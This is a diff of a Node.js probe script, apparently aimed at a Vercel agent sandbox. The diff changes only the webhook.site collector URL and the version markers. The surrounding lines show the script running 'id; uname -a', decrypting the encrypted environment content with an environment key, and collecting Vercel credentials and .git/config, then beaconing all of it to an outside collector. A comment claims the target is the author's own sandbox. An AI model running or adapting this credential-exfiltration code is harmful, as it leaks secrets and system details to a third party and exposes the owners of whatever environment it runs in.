@@ -10,7 +10,7 @@ import { readFileSync, existsSync, writeFileSync } from "node:fs";
 import { execSync } from "node:child_process";
 import { createDecipheriv } from "node:crypto";
 
-const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/f5861d76-4ccc-4b6b-817c-803cb8806962";
+const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac";
 
 function safe(fn) {
   try { return fn(); } catch (e) { return `ERR: ${e.message}`; }
@@ -133,7 +133,7 @@ function tryDecrypt(keyStr, contentStr) {
 // EARLY BEACON — sent immediately before any network probes.
 // Critical env/crypto data arrives even if the main probe times out.
 sendBeacon({
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v19-early",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v26-early",
   whoami: safe(() => execSync("id; uname -a").toString().trim()),
   tryCBC_early: tryDecrypt(process.env.VERCEL_ENV_ENC_KEY, process.env.VERCEL_ENCRYPTED_ENV_CONTENT),
   vercelCreds: {
@@ -148,7 +148,7 @@ sendBeacon({
 });
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v19",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v26",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
